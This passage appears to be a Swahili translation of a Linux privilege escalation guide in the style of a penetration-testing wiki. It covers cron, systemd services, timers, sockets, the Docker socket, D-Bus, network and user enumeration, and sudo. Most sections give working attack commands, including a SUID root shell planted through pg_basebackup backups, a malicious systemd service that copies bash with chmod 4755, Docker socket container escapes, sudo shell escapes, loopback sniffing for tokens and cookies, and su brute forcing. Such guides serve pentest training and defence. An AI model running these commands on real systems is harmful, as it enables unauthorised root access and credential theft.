- `openat()`: fanya kazi ukitumia file descriptor ya directory inayoaminika.
- `mkstemp()`: unda temporary files atomically zikiwa na permissions salama.

### Binaries za cron zilizosainiwa kwa custom signature zenye payloads zinazoweza kuandikwa
Mtumiaji wa kawaida anayeweza kuandika binary halisi inayoendeshwa na cron job ya root anaweza kuvuka mpaka wa privilege, lakini ukaguzi wa custom signature unaweza kukataa replacement ambayo haijasainiwa. Katika hali iliyoandikwa, ELF inayomilikiwa na root ilikuwa na mode `0760`, ikiwezesha mwanachama wa group yake kuiandika huku mmiliki root akiweza kuitekeleza. Process trace iliyoonekana ilionyesha `objcopy` ikitoa `.text_sig` kabla job haijaendesha binary; script kamili ya verifier haikuweza kusomwa.<sup>[[2]](#references)</sup>

Replacement iliyofanikiwa ilisainiwa kwa signing material ya faragha iliyovuja, kwa kutumia ELF signer. [Nyaraka za format](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) zinaeleza sehemu ya signature inayotokana na `.text` ya executable. Kuongeza tu certificate au string inayolingana kwenye `.text_sig` hakujathibitishwa kuwa kunatosha kwa verifier isiyoonekana. Kagua scheduled path halisi, write access inayotumika, root invocation na verifier policy kabla ya kuhitimisha kuwa binary inayoweza kuandikwa na iliyosainiwa inaweza kutumiwa vibaya. Sehemu ya `.text_sig` peke yake ni kidokezo tu cha kufanya ukaguzi.

### Cron jobs zinazoendeshwa mara kwa mara

Unaweza kufuatilia processes ili kutafuta zile zinazoendeshwa kila dakika 1, 2 au 5. Labda unaweza kutumia fursa hiyo na kuongeza privileges.

Kwa mfano, ili **kufuatilia kila sekunde 0.1 kwa dakika 1**, **kupanga kwa commands zilizotekelezwa mara chache zaidi** na kufuta commands zilizotekelezwa mara nyingi zaidi, unaweza kufanya hivi:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (itafuatilia na kuorodhesha kila process inayoanza).

### Backups za root zinazohifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inaendesha `pg_basebackup` (au nakala yoyote ya recursive) dhidi ya directory ya database unayoweza kuandika, unaweza kupandikiza **SUID/SGID binary** itakayowekwa tena kama **root:root** pamoja na mode bits zilezile kwenye matokeo ya backup.<sup>[[26]](#references)</sup>

Mtiririko wa kawaida wa ugunduzi (ukiwa mtumiaji wa DB mwenye ruhusa ndogo):
- Tumia `pspy` kuona cron ya root ikiita kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kwamba unaweza kuandika kwenye cluster ya chanzo (kwa mfano, `/var/lib/postgresql/14/main`) na kwamba destination (`/opt/backups/current`) inakuwa inamilikiwa na root baada ya job.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi biti za ruhusa za faili wakati wa kunakili cluster; ikiendeshwa na root, faili za mahali pa kuhifadhi hupata **umiliki wa root + SUID/SGID iliyochaguliwa na mshambuliaji**. Utaratibu wowote sawa wa kuhifadhi nakala au kunakili unaohitaji ruhusa za juu, unaohifadhi ruhusa na kuandika kwenye mahali pa kutekelezea programu, uko hatarini.

### Kazi za cron zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya maoni** (bila herufi ya mstari mpya), na cronjob hiyo itafanya kazi. Mfano (zingatia herufi ya carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Ili kugundua entry hii ya stealth, kagua faili za cron kwa kutumia zana zinazoonyesha herufi za udhibiti:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika kwenye faili yoyote ya `.service`; ikiwa unaweza, **unaweza kulirekebisha** ili **litekeleze** **backdoor yako wakati** huduma **inapoanzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (huenda ukahitaji kusubiri hadi mashine iwashwe upya).\
Kwa mfano, tengeneza backdoor yako ndani ya faili ya .service kwa kutumia **`ExecStart=/tmp/script.sh`**

### Binaries za huduma zinazoweza kuandikwa

Kumbuka kwamba ukiwa na **ruhusa za kuandika kwenye binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha na kuweka backdoors ili huduma zikitekelezwa tena, backdoors nazo zitekelezwe.

### PATH ya systemd - Njia Husiani

Unaweza kuona PATH inayotumiwa na **systemd** kwa kutumia:

```bash
systemctl show-environment
```

Ukipata kwamba unaweza **write** kwenye folda yoyote ya njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths** zinazotumika kwenye faili za service configurations kama:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Kisha, unda **faili inayoweza kutekelezwa** yenye **jina sawa na binary ya relative path** ndani ya folda ya systemd PATH unayoweza kuandika, na huduma inapoombwa kutekeleza kitendo chenye athari (**Start**, **Stop**, **Reload**), **backdoor yako itatekelezwa** (kwa kawaida watumiaji wasio na mapendeleo hawawezi kuanzisha/kusimamisha huduma, lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za systemd unit ambazo majina yake huishia na `**.timer**` na ambazo hudhibiti faili za `**.service**` au matukio. **Timers** zinaweza kutumika badala ya cron kwa kuwa zina usaidizi uliojengewa ndani wa matukio ya muda wa kalenda na matukio ya muda wa monotonic, na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa kutumia:

```bash
systemctl list-timers --all
```

### Timers zinazoweza kuandikwa

Ukiweza kurekebisha timer, unaweza kuifanya itekeleze baadhi ya vitu vya systemd.unit (kama `.service` au `.target`).

```bash
Unit=backdoor.service
```

Katika nyaraka unaweza kusoma maelezo ya Unit:

> Unit ya kuwashwa muda wa timer unapokwisha. Hoja ni jina la unit, ambalo kiambishi tamati chake si ".timer". Ikiwa halijabainishwa, thamani hii huwa service yenye jina sawa na unit ya timer, isipokuwa kiambishi tamati. (Tazama hapo juu.) Inapendekezwa kuwa jina la unit inayowashwa na jina la unit ya timer yafanane, isipokuwa viambishi tamati.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Kupata unit fulani ya systemd (kama `.service`) ambayo **inatekeleza binary inayoweza kuandikwa**
- Kupata unit fulani ya systemd ambayo **inatekeleza njia ya relative** na una **ruhusa za kuandika** kwenye **systemd PATH** (ili kujifanya kuwa executable hiyo)

**Jifunze zaidi kuhusu timers kupitia `man systemd.timer`.**

### **Kuwasha Timer**

Ili kuwasha timer unahitaji root privileges na kutekeleza:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Kumbuka kuwa **timer** **huamilishwa** kwa kuunda symlink yake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya process** kwenye mashine moja au tofauti ndani ya miundo ya client-server. Hutumia faili za kawaida za Unix descriptor kwa mawasiliano kati ya kompyuta na husanidiwa kupitia faili za `.socket`.<sup>[[14]](#references)</sup>

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kupitia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti, lakini muhtasari wake hutumika **kuonyesha mahali itakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port itakayosikilizwa, n.k.)
- `Accept`: Huchukua thamani ya boolean. Ikiwa ni **true**, **service instance huanzishwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndiyo hupitishwa kwake. Ikiwa ni **false**, sockets zote za kusikiliza **hupitishwa zenyewe kwa service unit iliyoanzishwa**, na service unit moja pekee huanzishwa kwa miunganisho yote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs, ambapo service unit moja hushughulikia bila masharti trafiki yote inayoingia. **Chaguomsingi ni false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya kwa namna inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Huchukua mstari mmoja au zaidi wa amri, ambazo **hutekelezwa kabla** au **baada ya** **sockets**/FIFOs za kusikiliza **kuundwa** na kufungwa, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina kamili la faili, ikifuatiwa na arguments za process.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo **hutekelezwa kabla** au **baada ya** **sockets**/FIFOs za kusikiliza **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la `service` unit **itakayoamilishwa** wakati wa **trafiki inayoingia**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Chaguomsingi ni service yenye jina sawa na socket (isipokuwa kiambishi tamati kimebadilishwa). Katika hali nyingi, haipaswi kuhitajika kutumia chaguo hili.

### Faili za .socket zinazoweza kuandikwa

Ukipata faili ya `.socket` **inayoweza kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama hiki: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket haijaundwa. Kwa hivyo, huenda **ukahitaji kusubiri hadi mashine iwashwe upya.**\
_Kumbuka kuwa mfumo lazima uwe unatumia usanidi huo wa faili ya socket, la sivyo backdoor haitatekelezwa_

### Socket activation + njia ya unit inayoweza kuandikwa (unda service inayokosekana)

Usanidi mwingine usio sahihi wenye athari kubwa ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit inayorejelewa haipo
- mshambuliaji anaweza kuandika kwenye `/etc/systemd/system` (au njia nyingine ya kutafutia unit)

Katika hali hiyo, mshambuliaji anaweza kuunda `<name>.service`, kisha kuchochea trafiki kwenye socket ili systemd ipakie na kutekeleza service mpya kama root.

Mtiririko wa haraka:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets zinazoweza kuandikiwa

Ukitambua **socket yoyote inayoweza kuandikiwa** (_hapa tunazungumzia Unix Sockets, si faili za usanidi za `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na pengine kutumia udhaifu.

### Orodhesha Unix Sockets

```bash
netstat -a -p --unix
```

### Muunganisho ghafi

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Mfano wa exploitation:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Soketi za HTTP

Kumbuka kwamba kunaweza kuwa na **soketi zinazosikiliza maombi ya HTTP** (_sizungumzii faili za .socket bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa kutumia:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Ikiwa socket **itajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na pengine **kutumia udhaifu fulani**.

### Socket ya Docker Inayoweza Kuandikiwa

Socket ya Docker, ambayo mara nyingi hupatikana katika `/var/run/docker.sock`, ni faili muhimu inayopaswa kulindwa. Kwa chaguomsingi, mtumiaji wa `root` na washiriki wa kundi la `docker` wanaweza kuiandikia. Kuwa na ufikiaji wa kuandika kwenye socket hii kunaweza kusababisha kupandishwa kwa ruhusa. Hapa kuna maelezo ya jinsi ya kufanya hivyo na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Kupandisha Ruhusa kwa kutumia Docker CLI**

Ikiwa unaweza kuandika kwenye socket ya Docker, unaweza kupandisha ruhusa kwa kutumia amri zifuatazo:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Amri hizi zinakuruhusu kuendesha container yenye ufikiaji wa kiwango cha root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo Docker CLI haipatikani, socket ya Docker bado inaweza kutumiwa vibaya kupitia HTTP ghafi kwenye Unix socket. Mchakato unaotegemeka zaidi ni:

- kuunda container saidizi inayodumu kwa muda mrefu, huku mfumo wa faili wa root wa host ukiwa umewekwa kama bind mount
- kuianzisha
- kuunda instance ya `exec` ndani ya container saidizi hiyo
- kuanzisha instance ya `exec` na kusoma matokeo kupitia API

**Orodhesha picha za Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Unda na uanzishe kontena saidizi**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Unda instance ya exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Anzisha instance ya exec na usome output**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Mchoro huu kwa kawaida ni thabiti zaidi kuliko kujaribu kuendesha `attach` mwenyewe kwa kutumia `socat` au `nc -U`. Ukishaweza kuunda helper kwa kutumia `/:/host`, unaweza kutumia instances za ziada za `exec` kusoma faili kama `/host/root/...`, kuongeza SSH keys chini ya `/host/root/.ssh`, au kurekebisha faili za uanzishaji za host.

### Nyingine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu **uko ndani ya group `docker`**, una [**njia zaidi za kupandisha privileges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port** pia unaweza kuweza kuikompromiti](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoroka kwenye containers au kutumia vibaya container runtimes ili kupandisha privileges** katika:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ukigundua kuwa unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwa kuwa **unaweza kuweza kuitumia vibaya ili kupandisha privileges**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ukigundua kuwa unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwa kuwa **unaweza kuweza kuitumia vibaya ili kupandisha privileges**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni **mfumo wa inter-Process Communication (IPC)** wa kisasa unaowezesha applications kuwasiliana na kushiriki data kwa ufanisi. Ukiundwa kwa kuzingatia mifumo ya kisasa ya Linux, hutoa mfumo imara wa aina mbalimbali za mawasiliano kati ya applications.<sup>[[16]](#references)</sup>

Mfumo huu una uwezo mwingi na unaauni IPC ya msingi inayoboresha ubadilishanaji wa data kati ya processes, sawa na **UNIX domain sockets zilizoboreshwa**. Pia husaidia kutangaza events au signals, na hivyo kuwezesha muunganisho rahisi kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayoingia inaweza kusababisha music player kunyamazisha sauti, na kuboresha matumizi ya mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote object, unaorahisisha maombi ya huduma na miito ya methods kati ya applications na kurahisisha michakato ambayo kwa kawaida ilikuwa changamano.

D-Bus hutumia **mfumo wa allow/deny**, unaodhibiti ruhusa za ujumbe (miito ya methods, utumaji wa signals, n.k.) kulingana na athari ya jumla ya policy rules zinazolingana. Policies hizi hubainisha mwingiliano na bus, na zinaweza kuruhusu kupandisha privileges kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa hapa, ukieleza ruhusa za mtumiaji root kumiliki, kutuma ujumbe kwa, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Policies ambazo hazibainishi user au group hutumika kwa wote, huku policies za muktadha wa "default" zikitumika kwa zile ambazo hazijashughulikiwa na policies nyingine mahususi.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Jifunze jinsi ya kufanya enumeration na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inapendeza kila wakati kufanya enumeration ya mtandao na kubaini nafasi ya mashine.

### Enumeration ya jumla

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Ikiwa ingizo linalotumika la `/etc/inetd.conf` linaendesha GNU Inetutils `telnetd` kama root, angalia toleo la binary lililosanidiwa na listener ya ndani hata ikiwa port imefungwa kwa loopback pekee. GNU Inetutils 1.9.3 hadi 2.7 zilikuwa na [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) ambapo `USER` iliyotolewa na mteja ilifikia `login -f` (CVE-2026-24061). Mchakato au mfuatano wa toleo ni kiashiria; thibitisha hali ya patch ya vendor na daemon halisi kabla ya kuhitimisha kuwa iko kwenye hatari. [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) ina maelezo zaidi.

### Uchunguzi wa haraka wa uchujaji wa trafiki inayotoka

Ikiwa mwenyeji anaweza kutekeleza amri lakini callbacks zinashindwa, tofautisha haraka uchujaji wa DNS, usafirishaji, proxy na njia za mtandao:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Bandari zilizo wazi

Kabla ya kuifikia mashine, kagua kila mara huduma za mtandao zinazoendeshwa humo ambazo hukuweza kuwasiliana nazo awali:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Panga listeners kulingana na anwani ya bind:

- `0.0.0.0` / `[::]`: zinaweza kufikiwa kupitia interfaces zote za ndani.
- `127.0.0.1` / `::1`: za ndani pekee (zinafaa kwa tunnel/forward).
- IP mahususi za ndani (k.m. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinaweza kufikiwa tu kutoka kwenye segments za ndani.

### Mchakato wa kuchunguza huduma za ndani pekee

Unapochukua udhibiti wa host, huduma zilizounganishwa na `127.0.0.1` mara nyingi huwa zinaweza kufikiwa kwa mara ya kwanza kutoka kwenye shell yako. Mchakato wa haraka wa ndani ni:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS kama kichanganuzi cha mtandao (hali ya mtandao pekee)

Mbali na ukaguzi wa ndani wa PE, linPEAS inaweza kufanya kazi kama kichanganuzi maalumu cha mtandao. Hutumia binary zinazopatikana kwenye `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi zana.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Ukipitisha `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama network scanner pekee (ikikosa ukaguzi mwingine wa privilege-escalation).

### Sniffing

Angalia kama unaweza kunasa trafiki. Ukiweza, huenda ukaweza kupata credentials.

```
timeout 1 tcpdump
```

Ukaguzi wa vitendo wa haraka:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) ni muhimu sana katika post-exploitation kwa sababu huduma nyingi za ndani pekee huweka wazi tokens/cookies/credentials hapo:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Nasa sasa, changanua baadaye:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Watumiaji

### Uhesabuji wa Jumla

Angalia **wewe ni nani**, una **ruhusa** zipi, ni **watumiaji** gani waliopo kwenye mifumo, ni watumiaji gani wanaoweza **login** na ni watumiaji gani walio na **root privileges:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha ruhusa. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Ifanyie exploit** kwa kutumia: **`systemd-run -t /bin/bash`**

### Groups

Angalia ikiwa wewe ni **mwanachama wa group fulani** inayoweza kukupa ruhusa za root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia ikiwa kuna kitu chochote cha kuvutia kwenye clipboard (ikiwezekana)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Sera ya Nenosiri

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa hujali kusababisha kelele nyingi na binaries za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kubruteforce mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) pia hujaribu kubruteforce watumiaji unapotumia kigezo cha `-a`.

## Matumizi mabaya ya PATH inayoweza kuandikiwa

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH**, unaweza kupandisha ruhusa kwa **kuunda backdoor ndani ya folda hiyo inayoweza kuandikiwa**, yenye jina la amri itakayotumiwa na mtumiaji mwingine (ikiwezekana root), na ambayo **haipakuliwi kutoka kwenye folda iliyo kabla ya folda yako inayoweza kuandikiwa katika $PATH**.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo, au amri hizo zinaweza kuwa na biti ya suid. Iangalie kwa kutumia:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri**.<sup>[[8]](#references)</sup> Kwa mfano:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nenosiri.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Katika mfano huu, mtumiaji `demo` anaweza kuendesha `vim` kama `root`; sasa ni rahisi kupata shell kwa kuongeza ufunguo wa ssh kwenye saraka ya root au kwa kuita `sh`.

```
sudo vim -c '!sh'
```

### Ulinganisho wa Bash usionukuliwa kwenye script ya sudo

Katika Bash, upande wa kulia wa `[[ "$protected" == $candidate ]]` ni pattern. Ikiwa script ya sudo yenye uwezo wa root inajaza `candidate` kutoka kwenye faili inayodhibitiwa na mpigaji, thamani kama `prefix*` inaweza kulingana na mwanzo wa string iliyolindwa. Njia tofauti za mafanikio na hitilafu zinaweza kufichua prefix oracle. Nukuu upande wa kulia (`[[ "$protected" == "$candidate" ]]`) ikiwa unakusudia ulinganifu halisi. Kagua hoja halisi za sudo, chanzo cha ingizo, na tabia ya matawi inayoonekana kabla ya kuamua kuwa ulinganisho usionukuliwa unaweza kutumika vibaya. [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) inaeleza tabia hii ya pattern.

### Faili za mradi za PrusaSlicer chini ya sudo

